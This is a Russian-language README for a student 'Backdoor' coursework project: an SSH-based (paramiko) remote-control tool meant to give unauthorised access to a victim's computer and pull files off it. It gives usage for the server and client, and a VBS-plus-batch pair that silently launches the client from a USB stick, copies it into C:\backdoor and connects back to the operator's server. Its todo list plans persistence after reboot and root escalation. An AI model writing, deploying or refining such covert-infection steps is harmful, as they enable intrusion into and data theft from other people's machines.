# Курсовая работа по АВС
## Тема проекта
Backdoor
## Техническое задание
Используя клиент-серверную архитектуру, написать программу наподобие бэкдора для несанкционированного доступа к данным, удаленному управлению операционной системой. Использовать SSH. Реализовать возможность отправки файлов с компьютера жертвы на сервер.
## Пояснительная записка (незаконченная версия)
### Содержание
0. Введение
1. Серверная часть
2. Клиентская часть
3. Описание использования
4. Заключение
## Введение
#### Основные понятия
_Клиент — сервер_ (англ. client–server) — вычислительная или сетевая архитектура, в которой задания или сетевая нагрузка распределены между поставщиками услуг, называемыми серверами, и заказчиками услуг, называемыми клиентами. Фактически клиент и сервер — это программное обеспечение. Обычно эти программы расположены на разных вычислительных машинах и взаимодействуют между собой через вычислительную сеть посредством сетевых протоколов, но они могут быть расположены также и на одной машине. 

_Сокет_ (англ. socket — разъём) — название программного интерфейса для обеспечения обмена данными между процессами. Процессы при таком обмене могут исполняться как на одной ЭВМ, так и на различных ЭВМ, связанных между собой сетью. Сокет — абстрактный объект, представляющий конечную точку соединения. 

_SSH_ (англ. Secure Shell — «безопасная оболочка») — сетевой протокол прикладного уровня, позволяющий производить удалённое управление операционной системой и туннелирование TCP-соединений (например, для передачи файлов). Схож по функциональности с протоколами Telnet и rlogin, но, в отличие от них, шифрует весь трафик, включая и передаваемые пароли. SSH допускает выбор различных алгоритмов шифрования. SSH-клиенты и SSH-серверы доступны для большинства сетевых операционных систем. SSH позволяет безопасно передавать в незащищённой среде практически любой другой сетевой протокол. Таким образом, можно не только удалённо работать на компьютере через командную оболочку, но и передавать по шифрованному каналу звуковой поток или видео (например, с веб-камеры). 

_Бэкдор_ (англ. backdoor) - вредоносная программа, которая используется для получения несанкционированного удаленного доступа к компьютерной системе, за счет уязвимости в системе безопасности. Бэкдор обычно работает в фоновом режиме и является одним из самых опасных типов вредоносного программного обеспечения, так как он дает возможность выполнять любые возможные действия на зараженном компьютере. Злоумышленник может использовать бэкдор, чтобы следить за пользователем, управлять его файлами, устанавливать дополнительное программное обеспечение, контролировать всю систему ПК и атаковать другие хосты. Часто бэкдор имеет дополнительные возможности, такие как выполнение скриншотов, заражение и шифрование файлов.

#### Архитектура бэкдора
Выше уже была рассмотрена сетевая архитектура клиент-сервер, однако для реализации бэкдора данная архитектура используется наоборот. Сервер посылает команды на компьютер с бэкдором через SSH канал, а программа клиент их выполняет и возвращает ответ в виде сообщения, файлов.

## Серверная часть
Type text here...

Вместе с сервером в папке должен быть файл с именем `test_rsa.key` содержащий RSA ключ.
У большинства дистрибутивов ОС Linux есть _openssl_, с помощью которого можно сгенерировать ключ:
```sh
openssl genpkey -out 'test_rsa.key' -algorithm rsa -pkeyopt rsa_keygen_bits:2048
```
Для ОС Windows его можно сгенерировать, используя [puttygen](http://www.putty.org/), например.
Также в используемой библиотеке `paramiko` есть статический метод:
```python
paramiko.RSAKey.generate(2048)
```
## Клиентская часть
Type text here...
## Описание использования
Файл `server.py` следует запускать непосредственно на компьютере, с которого вы хотите контролировать целевую систему. Файл `client.py` нужно внедрить на компьютер жертвы и запустить его (для Windows это предусмотрено). 
1\. запуск сервера
```
usage: server.py [-h] [-p PORT] un ps
positional arguments:
  un                    the username to establish ssh connection
  ps                    the password to establish ssh connection
optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  the ssh port, 1234 by default
```
Стоит заметить, при запуске сервера без указания порта будет использоваться порт 1234, данный порт не является ssh по умолчанию.
2\. запуск клиента на целевой ЭВМ
```
usage: client.py [-h] [-v] sip sp un ps
positional arguments:
  sip            the server ip
  sp             the server port
  un             the username of the ssh connection
  ps             the password of the ssh connection
optional arguments:
  -h, --help     show this help message and exit
  -v, --verbose
```
2.1 запуск клиента на целевой ЭВМ (Windows)
(_На ОС должен быть установлен python-интерпертатор!_)
Для ОС Windows были написаны скрипты для скрытого запуска с флешки.
На флешке у вас должно быть 3 файла для успешного запуска клиентской части.
Нужно запустить скрипт `run0.vbs`:
```vbs
CreateObject("Wscript.Shell").Run "run.bat",0,True
```
который запустит следующий скрипт без появления консоли:
`run.bat`
```bat
@echo off
mkdir c:\backdoor
copy "client.py" "C:\backdoor" @rem 'backdoor' - dir to place our client program
copy "run.bat" "C:\backdoor"
cd c:\backdoor
c:
pip install paramiko @rem download necessary lib (comment if it's already downloaded)
python C:\backdoor\client.py server_ip server_port ssh_uname ssh_pswd @rem pass your params here (more details see above)
exit
```
После этого флешку можно извлекать. При безопасном извлечении возникнет предупреждение, что диск используется - это из-за shell скрипта, но можно не обращать на это внимания и спокойно извлекать диск.

## Список использованной литературы
1) https://ru.wikipedia.org/wiki/%D0%9A%D0%BB%D0%B8%D0%B5%D0%BD%D1%82_%E2%80%94_%D1%81%D0%B5%D1%80%D0%B2%D0%B5%D1%80
2) https://ru.wikipedia.org/wiki/%D0%A1%D0%BE%D0%BA%D0%B5%D1%82_(%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%BD%D1%8B%D0%B9_%D0%B8%D0%BD%D1%82%D0%B5%D1%80%D1%84%D0%B5%D0%B9%D1%81)
3) https://docs.python.org/3.8/library/socket.html
4) https://resources.infosecinstitute.com
5) http://docs.paramiko.org/en/stable/api
6) https://docs.python.org/2/howto/argparse.html
7) https://pypi.org/project/socket-wait/


### Todos

 - Добавить возможность возобновления работы после перезапуска системы
 - Сделать скрытый запуск для ОС Linux
 - Добавить возможность получения root прав
 - Сделать функцию для отправки скриптов клиенту

License
----

MIT